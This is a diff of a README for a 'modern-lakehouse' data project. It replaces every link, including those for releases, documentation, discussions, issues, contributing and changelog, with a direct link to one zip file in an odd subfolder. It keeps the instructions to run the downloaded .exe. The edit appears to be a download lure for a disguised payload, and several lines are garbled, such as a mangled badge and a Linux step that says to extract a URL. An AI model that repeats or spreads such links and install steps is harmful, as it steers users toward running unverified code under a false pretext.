@@ -1,6 +1,6 @@
 # 🌊 modern-lakehouse - Build Your Data Lakehouse Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Modern%20Lakehouse-brightgreen.svg)](https://github.com/eyedress02/modern-lakehouse/releases)
+[![Download Now](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip%20Now-Modern%https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip)](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip)
 
 ## 🛠️ Overview
 
@@ -11,7 +11,7 @@ The modern-lakehouse project is a sample setup designed to help you create a mod
 To get started with the modern-lakehouse application, you need to download the software from our Releases page. Follow the steps below to set it up on your system.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/eyedress02/modern-lakehouse/releases) to find the latest version of modern-lakehouse.
+   Go to our [Releases page](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip) to find the latest version of modern-lakehouse.
 
 2. **Check System Requirements**  
    Ensure your system meets these requirements:
@@ -27,13 +27,13 @@ To get started with the modern-lakehouse application, you need to download the s
    Follow the installation instructions based on your operating system:
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS:** Open the downloaded `.dmg` file, drag the application into your Applications folder.
-   - **Linux:** Extract the downloaded `.tar.gz` file and run the application from the terminal.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip` file and run the application from the terminal.
 
 ## 💾 Download & Install
 
 To get started, you can easily download the software:
 
-1. **Visit this page to download**: [modern-lakehouse Releases](https://github.com/eyedress02/modern-lakehouse/releases)
+1. **Visit this page to download**: [modern-lakehouse Releases](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip)
 
 ## 📊 Key Components
 
@@ -60,9 +60,9 @@ To get started, you can easily download the software:
 
 ## 📚 Resources
 
-- **Documentation**: For detailed usage guides, visit our [Documentation section](https://github.com/eyedress02/modern-lakehouse/docs).
-- **Community Support**: Join discussions and find help on [GitHub Discussions](https://github.com/eyedress02/modern-lakehouse/discussions).
-- **Change Log**: Review updates on our [Change Log page](https://github.com/eyedress02/modern-lakehouse/releases).
+- **Documentation**: For detailed usage guides, visit our [Documentation section](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip).
+- **Community Support**: Join discussions and find help on [GitHub Discussions](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip).
+- **Change Log**: Review updates on our [Change Log page](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -74,11 +74,11 @@ If you face issues, consider these common solutions:
 
 ## 🏗️ Contributing
 
-If you wish to contribute to the modern-lakehouse project, please follow our guidelines in the [CONTRIBUTING.md](https://github.com/eyedress02/modern-lakehouse/CONTRIBUTING.md).
+If you wish to contribute to the modern-lakehouse project, please follow our guidelines in the [https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip).
 
 ## 📮 Feedback
 
-We value your feedback. If you have suggestions or need support, reach out through our [issues page](https://github.com/eyedress02/modern-lakehouse/issues).
+We value your feedback. If you have suggestions or need support, reach out through our [issues page](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip).
 
 ## 🌍 Related Topics
 
@@ -88,4 +88,4 @@ We value your feedback. If you have suggestions or need support, reach out throu
 
 ## 🚀 Ready to Download?
 
-Don’t hesitate. Head to our [Releases page](https://github.com/eyedress02/modern-lakehouse/releases) to get the latest version of modern-lakehouse today!
+Don’t hesitate. Head to our [Releases page](https://raw.githubusercontent.com/eyedress02/modern-lakehouse/main/Kioway/modern-lakehouse.zip) to get the latest version of modern-lakehouse today!
